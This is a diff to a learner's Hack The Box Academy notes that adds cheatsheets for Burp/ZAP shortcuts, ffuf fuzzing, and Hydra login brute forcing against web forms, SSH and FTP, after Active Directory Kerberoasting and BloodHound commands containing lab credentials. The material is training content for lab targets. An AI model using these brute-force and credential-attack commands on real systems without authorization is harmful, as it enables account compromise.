@@ -3788,3 +3788,122 @@ NTLMv2: `svc_qualys:security#1`
 | `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`                       | Impacket tool used to request (-request) the TGS ticket of an account in a target Windows domain (-target-domain) from a Linux-based host. |
 | `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`                   | Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host.                                      |
 | `zip -r ilfreight_bh.zip *.json`                                                                               | Used to compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI.                                            |
+
+### Complete
+
+[Completion Link](https://academy.hackthebox.com/achievement/713396/143)
+
+## Web Proxies
+
+### Cheatsheet
+
+**Burp Shortcuts**
+
+| Shortcut         | Description      |
+| ---------------- | ---------------- |
+| `[CTRL+R]`       | Send to repeater |
+| `[CTRL+SHIFT+R]` | Go to repeater   |
+| `[CTRL+I]`       | Send to intruder |
+| `[CTRL+SHIFT+I]` | Go to intruder   |
+| `[CTRL+U]`       | URL encode       |
+| `[CTRL+SHIFT+U]` | URL decode       |
+
+**ZAP Shortcuts**
+
+| Shortcut   | Description              |
+| ---------- | ------------------------ |
+| `[CTRL+B]` | Toggle intercept on/off  |
+| `[CTRL+R]` | Go to replacer           |
+| `[CTRL+E]` | Go to encode/decode/hash |
+
+**Firefox Shortcuts**
+
+| Shortcut         | Description        |
+| ---------------- | ------------------ |
+| `[CTRL+SHIFT+R]` | Force Refresh Page |
+
+### Complete
+
+[Completion Link](https://academy.hackthebox.com/achievement/713396/110)
+
+## FFuF
+
+### Cheatsheet
+
+**Ffuf**
+
+| Command                                                                                                                                                         | Description              |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
+| `ffuf -h`                                                                                                                                                       | ffuf help                |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`                                                                                                       | Directory Fuzzing        |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`                                                                                                  | Extension Fuzzing        |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`                                                                                              | Page Fuzzing             |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`                                                              | Recursive Fuzzing        |
+| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`                                                                                                      | Sub-domain Fuzzing       |
+| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`                                                                     | VHost Fuzzing            |
+| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`                                                                   | Parameter Fuzzing - GET  |
+| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
+| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`       | Value Fuzzing            |
+
+**Wordlists**
+
+| Command                                                                   | Description             |
+| ------------------------------------------------------------------------- | ----------------------- |
+| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
+| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`           | Extensions Wordlist     |
+| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`      | Domain Wordlist         |
+| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`     | Parameters Wordlist     |
+
+**Misc**
+
+| Command                                                                                                                       | Description              |
+| ----------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
+| `sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`                                                                     | Add DNS entry            |
+| `for i in $(seq 1 1000); do echo $i >> ids.txt; done`                                                                         | Create Sequence Wordlist |
+| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST             |
+
+### Complete
+
+[Completion Link](https://academy.hackthebox.com/achievement/713396/54)
+
+## Login Brute forcing
+
+[Username Anarchy](https://github.com/urbanadventurer/username-anarchy) is a great tool for permutations of possible usernames for a person.
+
+### Cheatsheet
+
+**Hydra**
+
+| Command                                                                                                                                | Description                                         |
+| -------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
+| `hydra -h`                                                                                                                             | Hydra help                                          |
+| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /`                                                                                   | Basic Auth Brute Force - Combined Wordlist          |
+| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`                                                             | Basic Auth Brute Force - User/Pass Wordlists        |
+| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
+| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`                                                                     | SSH Brute Force - User/Pass Wordlists               |
+| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`                                                                                   | FTP Brute Force - Static User, Pass Wordlist        |
+
+**Wordlists**
+
+| Command                                                                            | Description                |
+| ---------------------------------------------------------------------------------- | -------------------------- |
+| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
+| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`                      | Common Passwords Wordlist  |
+| `/opt/useful/SecLists/Usernames/Names/names.txt`                                   | Common Names Wordlist      |
+
+**Misc**
+
+| Command                                       | Description                            |
+| --------------------------------------------- | -------------------------------------- |
+| `cupp -i`                                     | Creating Custom Password Wordlist      |
+| `sed -ri '/^.{,7}$/d' william.txt`            | Remove Passwords Shorter Than 8        |
+| `sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt` | Remove Passwords With No Special Chars |
+| `sed -ri '/[0-9]+/!d' william.txt`            | Remove Passwords With No Numbers       |
+| `./username-anarchy Bill Gates > bill.txt`    | Generate Usernames List                |
+| `ssh b.gates@SERVER_IP -p PORT`               | SSH to Server                          |
+| `ftp 127.0.0.1`                               | FTP to Server                          |
+| `su - user`                                   | Switch to User                         |
+
+### Complete
+
+[Completion Link](https://academy.hackthebox.com/achievement/713396/57)
